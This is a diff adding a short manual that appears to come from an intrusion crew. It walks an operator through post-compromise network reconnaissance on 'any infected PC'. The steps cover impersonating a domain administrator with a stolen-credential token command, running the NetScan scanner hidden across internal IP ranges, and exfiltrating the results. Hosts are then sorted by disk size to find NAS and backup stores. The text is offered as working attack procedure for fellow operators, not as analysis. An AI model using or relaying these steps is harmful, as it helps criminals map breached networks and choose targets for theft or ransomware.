@@ -1,0 +1,23 @@
+A great tool is NetScan, which makes it easy to scout and find NAS \ Backup, etc.
+Scans networks by range using the credentials of the user / administrator on whose behalf the software was launched.
+Returns the following information:
+Hostname, Open Ports, Group / Domain Membership, Total Disk Space, Available Shares, Device Manufacturer, PC / Server Role
+
+1) Load the NetScan folder on any infected PC. Let's say 
+C:\Programdata\netscan
+
+2) cd C:\programdata\netscan
+
+3) make_token DOMAIN\admin password
+
+4) shell netscan.exe /hide /auto:"result.xml" /config:netscan.xml /range:192.168.0.1-192.168.1.255
+
+We change the ranges to our own, do not touch the rest
+
+5) We are waiting. After completion, the result.xml file will appear in our folder, we download it to our computer
+
+6) We open NetScan on our Windows, load the downloaded file there and see the result in a convenient format.
+We sort by disk size, so you will immediately understand where the juice itself is hidden
+
+Special thanks to Perry for helping me find the technical documentation on which this manual is based.
+Sonic, you can add NetScan to the algorithm
